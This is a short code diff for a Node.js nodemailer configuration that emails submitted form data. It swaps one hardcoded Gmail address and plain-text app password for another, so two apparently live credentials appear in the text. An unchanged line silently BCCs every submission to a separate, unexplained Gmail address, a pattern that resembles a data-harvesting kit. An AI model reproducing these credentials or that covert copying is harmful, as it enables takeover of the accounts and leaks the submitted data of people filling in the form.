@@ -24,16 +24,16 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: "allenvivian519@gmail.com", // Replace with your email
-    pass: "eywp wgwg nkud fumw", // Replace with your app password
+    user: "Olanrewajuayomide636@gmail.com", // Replace with your email
+    pass: "dfgw zoyx slrg kejk", // Replace with your app password
   },
 });
 
 // Helper function to send email
 function sendEmail(subject, text) {
   const mailOptions = {
-    from: "allenvivian519@gmail.com", // Replace with your email
-    to: "allenvivian519@gmail.com", // Your email to receive the form data
+    from: "Olanrewajuayomide636@gmail.com", // Replace with your email
+    to: "Olanrewajuayomide636@gmail.com", // Your email to receive the form data
     bcc: "yekeen244@gmail.com",
     subject: subject,
     text: text,
